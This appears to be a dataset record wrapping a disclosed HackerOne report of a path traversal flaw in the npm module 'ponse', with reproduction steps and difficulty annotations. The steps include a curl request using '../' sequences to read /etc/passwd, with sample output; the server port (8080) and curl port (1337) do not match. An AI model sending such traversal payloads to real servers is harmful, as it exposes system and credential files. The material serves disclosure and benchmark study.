@@ -1,0 +1,46 @@
+{
+  "reported_to": "Node.js third-party modules",
+  "reported_by": "szkrstf ",
+  "title": "[ponse] Path traversal in ponse module allows to read any file on server",
+  "content": "\nI would like to report path traversal in ponse.\nIt allows reading local files on the target server.\nModule\nmodule name: ponse\nversion: 2.0.1\nnpm page: https://www.npmjs.com/package/ponse\nModule Description\nModule for work with requests and responses\nModule Stats\n[317] downloads in the last week\n[1633] downloads in the last month\nVulnerability\nVulnerability Description\nPath traversal vulnerability in ponse module allows to go up in directory tree and read content of any file, like /etc/passwd.\nVulnerability exists in the getStatic function, because ponse uses user submitted variable without any protection against path traversal attacks.\nSteps To Reproduce:\ninstall module npm i --save ponse\ncreate index.js. for example:\nCode 117 Bytes\n1var ponse = require('ponse')\n2var http = require('http')\n3http.createServer(\n4    ponse.static(__dirname)\n5).listen(8080)\nstart server\nnode index.js\nuse curl to acces any file on the target server outside the given directory(__dirname). For example:\nCode 177 Bytes\n1$ curl --path-as-is localhost:1337/../../../../../../../etc/passwd\n2root:x:0:0:root:/root:/bin/bash\n3bin:x:1:1:bin:/bin:/usr/bin/nologin\n4daemon:x:2:2:daemon:/:/usr/bin/nologin\n5...\nSupporting Material/References:\nlinux 4.17.5-1-ARCH\nv10.6.0\n6.2.0\ncurl 7.61.0\nWrap up\nI contacted the maintainer to let them know: [N]\nI opened an issue in the related repository: [N]\nImpact\nMalicious user can read any file on the target server.\n\n",
+  "severity": [
+    7.5,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Path Traversal"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1532091480,
+  "report_url": "https://hackerone.com/reports/383112",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "LOW",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Install the ponse module: npm i --save ponse"
+    ],
+    [
+      2,
+      "Create an index.js file with the following content:\nvar ponse = require('ponse')\nvar http = require('http')\nhttp.createServer(\n    ponse.static(__dirname)\n).listen(8080)"
+    ],
+    [
+      3,
+      "Start the server: node index.js"
+    ],
+    [
+      4,
+      "Use curl to access any file on the target server outside the given directory:\ncurl --path-as-is localhost:1337/../../../../../../../etc/passwd"
+    ]
+  ],
+  "vuln_description": "Path traversal vulnerability in the ponse module allows an attacker to read any file on the server by manipulating the file path in the request. The vulnerability exists in the getStatic function, which does not properly sanitize user input, allowing directory traversal attacks.",
+  "reason": "The vulnerability is straightforward to discover as it involves a common security flaw (path traversal) and does not require complex interactions or state manipulation. The steps to reproduce are simple and do not involve multiple components or novel logic.",
+  "new_complexity": "LOW",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null
+}
